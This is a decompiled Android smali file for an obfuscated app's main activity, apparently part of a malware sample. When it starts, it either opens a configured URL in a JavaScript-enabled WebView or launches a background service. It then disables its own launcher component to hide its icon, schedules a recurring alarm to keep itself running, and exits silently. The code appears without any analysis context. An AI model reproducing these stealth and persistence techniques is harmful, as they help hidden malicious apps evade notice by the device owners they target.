.class public Lnaqsl/ebxcb/exu/Activity/MainActivity;
.super Landroid/app/Activity;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;

.field ifdf:Lnaqsl/ebxcb/exu/ifdf;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Activity/MainActivity;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Activity/MainActivity;->ifdf:Lnaqsl/ebxcb/exu/ifdf;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/for;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/for;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 6

    const-string v0, "startAlarm"

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/MainActivity;->ifdf:Lnaqsl/ebxcb/exu/ifdf;

    iget-boolean p1, p1, Lnaqsl/ebxcb/exu/ifdf;->try:Z

    const/4 v1, 0x1

    if-eqz p1, :cond_29

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x13

    if-lt p1, v2, :cond_29

    new-instance p1, Landroid/webkit/WebView;

    invoke-direct {p1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    invoke-virtual {v2, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v2, p0, Lnaqsl/ebxcb/exu/Activity/MainActivity;->ifdf:Lnaqsl/ebxcb/exu/ifdf;

    iget-object v2, v2, Lnaqsl/ebxcb/exu/ifdf;->byte:Ljava/lang/String;

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    goto :goto_38

    :cond_29
    :try_start_29
    new-instance p1, Landroid/content/Intent;

    const-class v2, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-direct {p1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance p1, Lnaqsl/ebxcb/exu/int;

    invoke-direct {p1}, Lnaqsl/ebxcb/exu/int;-><init>()V
    :try_end_38
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_38} :catch_38

    :catch_38
    :goto_38
    new-instance p1, Landroid/content/ComponentName;

    const-class v2, Lnaqsl/ebxcb/exu/Activity/MainActivity;

    invoke-direct {p1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/4 v3, 0x2

    invoke-virtual {v2, p1, v3, v1}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    :try_start_47
    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/MainActivity;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v1, "interval"

    invoke-virtual {p1, p0, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    int-to-long v1, p1

    invoke-static {p0, v0, v1, v2}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_57
    .catch Ljava/lang/Exception; {:try_start_47 .. :try_end_57} :catch_58

    goto :goto_5d

    :catch_58
    const-wide/16 v1, 0x2710

    invoke-static {p0, v0, v1, v2}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;J)V

    :goto_5d
    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/MainActivity;->ifdf:Lnaqsl/ebxcb/exu/ifdf;

    iget-boolean p1, p1, Lnaqsl/ebxcb/exu/ifdf;->try:Z

    if-nez p1, :cond_66

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_66
    return-void
.end method
